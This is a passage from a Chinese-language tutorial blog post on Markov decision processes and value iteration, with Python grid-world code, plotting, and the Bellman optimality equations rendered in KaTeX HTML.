<span class="hljs-attr">gamma</span> = <span class="hljs-number">0.9</span>
<span class="hljs-attr">theta</span> = <span class="hljs-number">1</span>e-<span class="hljs-number">4</span>
<span class="hljs-attr">V</span> = np.zeros(n_states)

while True:
    <span class="hljs-attr">delta</span> = <span class="hljs-number">0</span>
    for s in range(n_states):
        if <span class="hljs-attr">s</span> == terminal_state:
            continue
        <span class="hljs-attr">v</span> = V[s]
        V<span class="hljs-section">[s]</span> = max(<span class="hljs-section">[next_state_reward(s,a)[1]</span> + gamma*V<span class="hljs-section">[next_state_reward(s,a)[0]]</span> for a in range(n_actions)])
        <span class="hljs-attr">delta</span> = max(delta, abs(v-V[s]))
    if delta &lt; theta:
        break

<span class="hljs-comment"># 3. 求最优策略</span>
<span class="hljs-attr">policy</span> = np.full(n_states,<span class="hljs-string">''</span>,dtype=object)
for s in range(n_states):
    if <span class="hljs-attr">s</span> == start_state:
        policy<span class="hljs-section">[s]</span> = 'S'
    elif <span class="hljs-attr">s</span> == terminal_state:
        policy<span class="hljs-section">[s]</span> = 'T'
    else:
        <span class="hljs-attr">q_values</span> = [next_state_reward(s,a)[<span class="hljs-number">1</span>] + gamma*V[next_state_reward(s,a)[<span class="hljs-number">0</span>]] for a in range(n_actions)]
        policy<span class="hljs-section">[s]</span> = action_symbols<span class="hljs-section">[np.argmax(q_values)]</span>

<span class="hljs-attr">grid_policy</span> = policy.reshape(n_rows, n_cols)
print("最优策略：")
print(grid_policy)

<span class="hljs-comment"># 4. 可视化值函数和策略</span>
plt.figure(<span class="hljs-attr">figsize</span>=(<span class="hljs-number">6</span>,<span class="hljs-number">6</span>))
plt.imshow(V.reshape(n_rows, n_cols), <span class="hljs-attr">cmap</span>=<span class="hljs-string">'cool'</span>, interpolation=<span class="hljs-string">'nearest'</span>)
for i in range(n_rows):
    for j in range(n_cols):
        plt.text(j,i,f"{V<span class="hljs-section">[i*n_cols+j]</span>:.1f}\n{grid_policy<span class="hljs-section">[i,j]</span>}",<span class="hljs-attr">ha</span>=<span class="hljs-string">'center'</span>,va=<span class="hljs-string">'center'</span>,color=<span class="hljs-string">'black'</span>)
plt.title("Grid World: State Values and Optimal Policy")
plt.colorbar(<span class="hljs-attr">label</span>=<span class="hljs-string">"Value"</span>)
plt.show()
</code></pre>
<p>运行结果如下图，其中输出网格中每个状态对应的最优动作（↑↓←→），终点用 T 标记。颜色越深表示状态价值越高，图上同时标出最优策略，可以直观看到智能体如何从左上角走向右下角终点。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5ef8804690d849acbce83460ab7310b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWljb3Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769529615&amp;x-signature=TjYy9nXiry42OCg4hAwRBa43Ajo%3D" alt="" loading="lazy"/></p>
<p>MDP 在强化学习和决策问题中应用广泛。例如，机器人控制任务中，状态表示机器人的位置和姿态，动作表示可执行的控制命令；在资源调度问题中，状态表示系统资源使用情况，动作表示任务分配策略；在游戏 AI 中，状态表示游戏棋盘或场景信息，动作表示玩家可能采取的操作。通过将这些问题建模为 MDP，可以系统性地求解最优策略，实现智能体自主决策和长期收益最大化。</p>
<p>马尔可夫决策过程提供了一个结构化的数学框架，将序列决策问题形式化为状态、动作、奖励和转移概率的组合。通过动态规划、值迭代、策略迭代以及强化学习方法，MDP 可以帮助智能体在不确定环境中学习最优策略。作为强化学习的理论基础，MDP 不仅在学术研究中具有重要意义，也在机器人、游戏、调度和自动驾驶等实际应用中展现出强大的价值。</p>
<h3 data-id="heading-2">动态规划与值迭代</h3>
<p>在强化学习中，动态规划（Dynamic Programming, DP） 是求解决策问题的一种经典方法，它假设环境的状态转移概率和奖励函数已知，通过系统地分解问题、利用最优子结构特性求解最优策略。</p>
<p>值迭代（Value Iteration）是动态规划中最常用的一种算法，能够高效地计算马尔可夫决策过程（MDP）中的最优状态价值函数，从而导出最优策略。</p>
<p>动态规划的核心思想是 将复杂的决策问题拆解成子问题，并通过已解决的子问题结果来求解整体问题。对于强化学习中的 MDP（Markov Decision Process），动态规划的目标是计算每个状态的最优价值函数<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>V</mi><mo>∗</mo></msup><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">V^*(s)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span></span></span></span></span>。</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>V</mi><mo>∗</mo></msup><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mrow><mi>max</mi><mo>⁡</mo></mrow><mi>a</mi></msub><msub><mo>∑</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msub><mi>P</mi><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi mathvariant="normal">∣</mi><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo><mo fence="false" stretchy="true" minsize="1.2em" maxsize="1.2em">[</mo><mi>R</mi><mo stretchy="false">(</mo><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo separator="true">,</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo>+</mo><mi>γ</mi><msup><mi>V</mi><mo>∗</mo></msup><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo fence="false" stretchy="true" minsize="1.2em" maxsize="1.2em">]</mo></mrow><annotation encoding="application/x-tex">V^*(s) = \max_a \sum_{s'} P(s'|s,a) \big[ R(s,a,s') + \gamma V^*(s') \big]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"/><span class="mop"><span class="mop">max</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1783em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mord"><span class="delimsizing size1">[</span></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"/><span class="mord mathnormal" style="margin-right:0.05556em;">γ</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord"><span class="delimsizing size1">]</span></span></span></span></span></span></p>
<p>其中：</p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">s</span></span></span></span></span>表示当前状态</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">a</span></span></span></span></span>表示动作</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mtext>′</mtext></mrow><annotation encoding="application/x-tex">s′</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5556em;"/><span class="mord mathnormal">s</span><span class="mord">′</span></span></span></span></span>表示下一状态</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>s</mi><mtext>′</mtext><mo>∣</mo><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(s′∣s,a)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mord">′</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">∣</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mclose">)</span></span></span></span></span>为状态转移概率</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mo stretchy="false">(</mo><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo separator="true">,</mo><mi>s</mi><mtext>′</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">R(s,a,s′)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">s</span><span class="mord">′</span><span class="mclose">)</span></span></span></span></span>为奖励函数</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>γ</mi></mrow><annotation encoding="application/x-tex">γ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05556em;">γ</span></span></span></span></span>为折扣因子，控制未来奖励的重要性</li>
</ul>
<p>一旦求得最优状态价值函数 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>V</mi><mo>∗</mo></msup><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">V^*(s)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span></span></span></span></span>，最优策略 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>π</mi><mo>∗</mo></msup><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">π^∗(s)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span></span></span></span></span>可以通过选择在当前状态下能获得最大期望收益的动作得到：</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>π</mi><mo>∗</mo></msup><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo><mo>=</mo><mi>arg</mi><mo>⁡</mo><msub><mrow><mi>max</mi><mo>⁡</mo></mrow><mi>a</mi></msub><msub><mo>∑</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msub><mi>P</mi><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi mathvariant="normal">∣</mi><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo><mo fence="false" stretchy="true" minsize="1.2em" maxsize="1.2em">[</mo><mi>R</mi><mo stretchy="false">(</mo><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo separator="true">,</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo>+</mo><mi>γ</mi><msup><mi>V</mi><mo>∗</mo></msup><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo fence="false" stretchy="true" minsize="1.2em" maxsize="1.2em">]</mo></mrow><annotation encoding="application/x-tex">\pi^*(s) = \arg\max_a \sum_{s'} P(s'|s,a) \big[ R(s,a,s') + \gamma V^*(s') \big]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"/><span class="mop">ar<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop"><span class="mop">max</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1783em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mord"><span class="delimsizing size1">[</span></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"/><span class="mord mathnormal" style="margin-right:0.05556em;">γ</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord"><span class="delimsizing size1">]</span></span></span></span></span></span></p>
<p>值迭代（Value Iteration） 是一种基于动态规划的迭代方法，用于求解 MDP 的最优状态价值函数和策略。它的主要步骤如下：</p>
<ol>
<li>初始化：将每个状态的价值函数 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">V(s)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span></span></span></span></span>初始化为 0 或任意值。</li>
<li>迭代更新：对于每个状态 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">s</span></span></span></span></span>，更新其价值： <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo><mo>←</mo><msub><mrow><mi>max</mi><mo>⁡</mo></mrow><mi>a</mi></msub><msub><mo>∑</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msub><mi>P</mi><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi mathvariant="normal">∣</mi><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo><mo fence="false" stretchy="true" minsize="1.2em" maxsize="1.2em">[</mo><mi>R</mi><mo stretchy="false">(</mo><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo separator="true">,</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo>+</mo><mi>γ</mi><mi>V</mi><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo fence="false" stretchy="true" minsize="1.2em" maxsize="1.2em">]</mo></mrow><annotation encoding="application/x-tex">V(s) \leftarrow \max_a \sum_{s'} P(s'|s,a) \big[ R(s,a,s') + \gamma V(s') \big]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">←</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"/><span class="mop"><span class="mop">max</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1783em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mord"><span class="delimsizing size1">[</span></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">γV</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord"><span class="delimsizing size1">]</span></span></span></span></span></span></li>
<li>收敛判定：当所有状态价值更新变化量 Δ小于阈值 θ时，迭代停止。</li>
<li>导出最优策略：根据收敛后的价值函数，选择使期望收益最大的动作作为最优策略。</li>
</ol>
<p>相比策略迭代，值迭代每一步只更新价值函数，不需要显式地保存和更新策略，因此实现更简单且计算效率高。</p>
<p>下面通过一个 4×4 网格世界示例展示值迭代的实现：</p>
<pre><code class="hljs language-ini" lang="ini">import numpy as np
import matplotlib.pyplot as plt

<span class="hljs-comment"># 网格世界参数</span>
n_rows, <span class="hljs-attr">n_cols</span> = <span class="hljs-number">4</span>, <span class="hljs-number">4</span>
<span class="hljs-attr">n_states</span> = n_rows * n_cols
<span class="hljs-attr">n_actions</span> = <span class="hljs-number">4</span>  <span class="hljs-comment"># 上,下,左,右</span>
<span class="hljs-attr">action_offsets</span> = [(-<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),(<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>),(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)]
